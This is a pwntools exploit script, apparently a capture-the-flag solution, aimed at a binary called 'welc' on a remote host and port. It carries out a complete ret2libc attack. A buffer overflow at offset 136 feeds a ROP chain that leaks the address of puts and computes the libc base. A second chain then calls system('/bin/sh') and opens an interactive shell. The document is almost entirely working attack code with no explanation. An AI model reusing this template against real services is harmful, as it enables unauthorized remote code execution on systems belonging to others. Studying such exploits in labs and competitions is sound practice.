from pwn import *

elf = ELF("./welc")
context.binary = elf
context.terminal = ["x-terminal-emulator", "-e"]
libc = ELF('./libc.so.6',checksec=False)


#p = process(elf.path)
p = remote("20.216.39.14" ,1237)
#p = gdb.debug(elf.path,gdbscript = """
#init-pwndbg
#""")


offset = 136
pop_rdi = 0x0000000000401283
ret = 0x000000000040101a

payload1 = flat(
    b'A'*offset,
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.sym.main
)

p.recvuntil(b'?\n')
p.sendline(payload1)
leakPuts = unpack(p.recv(6).ljust(8,b'\x00'))
print("Direccion de puts leaked: " + hex(leakPuts))

libc.address = leakPuts - libc.sym.puts
print("Direccion base de GLIBC: " + hex(libc.address))

print("Direccion system GLIBC: " + hex(libc.sym.system))

bin_sh = next(libc.search(b'/bin/sh\x00'))

print("Direccion de bin sh GLIBC: " + hex(bin_sh))

payload2 = flat(
    b'A'*offset,
    ret,
    pop_rdi,
    bin_sh,
    libc.sym.system
)

p.recvuntil(b'?\n')
p.sendline(payload2)
p.interactive()
